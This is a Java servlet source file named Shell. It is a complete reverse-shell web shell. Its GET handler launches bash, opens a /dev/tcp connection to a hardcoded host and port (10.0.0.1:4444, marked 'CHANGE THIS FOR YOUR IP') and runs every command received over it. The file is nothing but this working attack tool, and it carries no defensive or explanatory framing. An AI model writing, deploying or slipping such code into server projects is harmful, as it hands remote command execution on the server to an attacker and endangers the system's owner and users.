package com.manchabalais.reverse.java;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 *
 * @author Julien Descannevelle
 */
public class Shell extends HttpServlet {
    
    private final String host = "10.0.0.1"; //CHANGE THIS FOR YOUR IP
    private final String port = "4444"; //CHANGE THIS IF YOU WANT TO CONNECT ON ANOTHER PORT

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        Runtime r = Runtime.getRuntime();
        String[] cmd = {"/bin/bash", "-c", "exec 5<>/dev/tcp/"+host+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        try {
            p.waitFor();
        } catch (InterruptedException ex) {
            response.getWriter().println(ex.getMessage());
        }
    }
}
